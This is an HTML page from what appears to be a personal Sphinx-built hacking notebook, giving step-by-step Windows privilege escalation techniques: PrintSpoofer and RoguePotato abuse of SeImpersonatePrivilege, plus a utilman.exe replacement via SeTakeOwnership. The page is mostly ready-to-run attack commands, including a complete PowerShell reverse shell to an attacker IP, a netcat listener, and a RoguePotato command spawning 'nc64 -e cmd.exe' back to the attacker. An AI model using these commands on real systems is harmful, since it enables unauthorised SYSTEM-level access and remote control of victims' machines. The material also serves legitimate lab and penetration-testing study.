@@ -1,0 +1,210 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" data-content_root="../../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Who am I privilege - PE &mdash; docs 0.1 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../../_static/pygments.css?v=b86133f3" />
+      <link rel="stylesheet" type="text/css" href="../../../_static/css/theme.css?v=9edc463e" />
+
+  
+      <script src="../../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../../_static/documentation_options.js?v=2709fde1"></script>
+      <script src="../../../_static/doctools.js?v=fd6eb6e6"></script>
+      <script src="../../../_static/sphinx_highlight.js?v=6ffebe34"></script>
+    <script src="../../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" />
+    <link rel="next" title="Insecure Permissions on Service Executable" href="inpermser.html" />
+    <link rel="prev" title="PE Windows Homepage" href="index.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../../index.html" class="icon icon-home">
+            docs
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../../../coding/index.html">Coding Homepage</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="../../index.html">Hacking Home Page</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="../../SQL/index.html">SQLI Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../FWbypass/index.html">Hacking Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../enum/index.html">Enumeration Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../AD/index.html">Active Directory  Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../metasploit/index.html">Metasploit Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../BoF/index.html">BoF Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../shells/index.html">Reverse Shells Home Page</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="../index.html">PE Homepage</a><ul class="current">
+<li class="toctree-l3 current"><a class="reference internal" href="index.html">PE Windows Homepage</a><ul class="current">
+<li class="toctree-l4 current"><a class="current reference internal" href="#">Who am I privilege - PE</a></li>
+<li class="toctree-l4"><a class="reference internal" href="inpermser.html">Insecure Permissions on Service Executable</a></li>
+<li class="toctree-l4"><a class="reference internal" href="index.html#indices-and-tables">Indices and tables</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../Linux/index.html">Linux PE page</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../GTFO.html">GTFO PE</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../index.html#indices-and-tables">Indices and tables</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../pivot/index.html">Network Pivot Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../wireshark.html">Wireshark tips</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../PWdecrypt/index.html">Password Decryption Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../exploits/index.html">Exploits Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../github/index.html">Github Hacking Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../C2/index.html">C2 Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../notableKaliLocations/index.html">Notable Kali Locations Home Page</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../index.html#indices-and-tables">Indices and tables</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="../../../defense/index.html">Cyber Defense Home Page</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../IT/index.html">IT Homepage</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../interview_questions/index.html">interview questions</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../walkthroughs/index.html">Walkthroughs Page</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../../photoshop/index.html">Photoshop home Page</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">docs</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="../../index.html">Hacking Home Page</a></li>
+          <li class="breadcrumb-item"><a href="../index.html">PE Homepage</a></li>
+          <li class="breadcrumb-item"><a href="index.html">PE Windows Homepage</a></li>
+      <li class="breadcrumb-item active">Who am I privilege - PE</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../../_sources/hacking/PE/Windows/waipriv.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="who-am-i-privilege-pe">
+<h1>Who am I privilege - PE<a class="headerlink" href="#who-am-i-privilege-pe" title="Link to this heading"></a></h1>
+<section id="seimpersonateprivilege">
+<h2>SeImpersonatePrivilege<a class="headerlink" href="#seimpersonateprivilege" title="Link to this heading"></a></h2>
+<section id="printspool">
+<h3>Printspool<a class="headerlink" href="#printspool" title="Link to this heading"></a></h3>
+<ol class="arabic simple">
+<li><p>Determine if the victim system is x64 or x32 with the following command</p></li>
+</ol>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sysinfo</span>
+</pre></div>
+</div>
+<ol class="arabic simple" start="2">
+<li><p>Go and verify the privilege settings with the following command:</p></li>
+</ol>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">whoami /priv</span>
+</pre></div>
+</div>
+<ol class="arabic simple" start="3">
+<li><p>Go and get <cite>PrintSpoofer &lt;https://github.com/itm4n/PrintSpoofer/releases/&gt;</cite></p></li>
+<li><p>Run the following command to create shell.ps1</p></li>
+</ol>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span><span class="nv">client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">&#39;Attacker.IP.x.x&#39;</span>,Attacker<span class="w"> </span>Port<span class="o">)</span><span class="p">;</span><span class="nv">$s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span>..65535<span class="p">|</span>%<span class="o">{</span><span class="m">0</span><span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$s</span>.Read<span class="o">(</span><span class="nv">$b</span>,<span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="nv">$b</span>.Length<span class="o">))</span><span class="w"> </span>-ne<span class="w"> </span><span class="m">0</span><span class="o">){</span><span class="p">;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>-TypeName<span class="w"> </span>System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$b</span>,0,<span class="w"> </span><span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sb</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span>iex<span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Out-String<span class="w"> </span><span class="o">)</span><span class="p">;</span><span class="nv">$sb2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sb</span><span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;PS &#39;</span><span class="w"> </span>+<span class="w"> </span><span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path<span class="w"> </span>+<span class="w"> </span><span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sbt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sb2</span><span class="o">)</span><span class="p">;</span><span class="nv">$s</span>.Write<span class="o">(</span><span class="nv">$sbt</span>,0,<span class="nv">$sbt</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$s</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
+</pre></div>
+</div>
+<ol class="arabic simple" start="5">
+<li><p>Run a netcat shell</p></li>
+</ol>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nc -lvnp 4444</span>
+</pre></div>
+</div>
+<ol class="arabic simple" start="6">
+<li><p>Go and run the following command on the victim machine</p></li>
+</ol>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PrintSpoofer64.exe -c &quot;cmd /c powershell -c C:\shell.ps1\location&quot;</span>
+</pre></div>
+</div>
+</section>
+<section id="roguepotato">
+<h3>RoguePotato<a class="headerlink" href="#roguepotato" title="Link to this heading"></a></h3>
+<blockquote>
+<div><p>The exploit will force the victim machine to try and instantiate an object through DCOM against the attacker’s machine. To know how to connect to that specific object, the client machine will perform a process known as Object eXporter IDentifier (OXID) resolution. Simpy put, OXID resolution is the process in which a client machine sends the OXID they want to connect to, and receives instructions from the server on how to actually contact the object in question, which in this case is achieved through a named pipe. OXID resolution occurs through port 135/TCP.</p>
+<p>The OXID resolver (controlled by the attacker) will spoof a response to force a connection against a non-existent named pipe that the exploit itself will register in the target system. The named pipe will require authentication, which will then be used to impersonate the connecting user.</p>
+<p>Port 135 is used in any default Windows installation, making it impossible to bind the fake OXID resolver on the same target machine. To overcome this, the exploit will connect back to the attacker machine, which will need to redirect the OXID resolution query back to the target machine on a different port than 135. This can be easily done using socat</p>
+</div></blockquote>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sudo socat tcp-listen:135,reuseaddr,fork tcp:MACHINE_IP:9999</span>
+<span class="go">nc -lvp 4448</span>
+
+<span class="go">c:\tools\roguepotato\RoguePotato.exe -r ATTACKER_IP -e &quot;C:\tools\nc64 -e cmd.exe ATTACKER_IP 4448&quot; -l 9999</span>
+</pre></div>
+</div>
+</section>
+</section>
+<section id="setakeownership">
+<h2>SeTakeOwnership<a class="headerlink" href="#setakeownership" title="Link to this heading"></a></h2>
+<section id="utilman-exe">
+<h3>utilman.exe<a class="headerlink" href="#utilman-exe" title="Link to this heading"></a></h3>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">takeown /f C:\Windows\System32\Utilman.exe</span>
+<span class="go">icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span>
+<span class="go">copy cmd.exe utilman.exe</span>
+</pre></div>
+</div>
+<p>Lock and press ease of access button</p>
+</section>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
+        <a href="index.html" class="btn btn-neutral float-left" title="PE Windows Homepage" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
+        <a href="inpermser.html" class="btn btn-neutral float-right" title="Insecure Permissions on Service Executable" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025, mynameisORIG.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
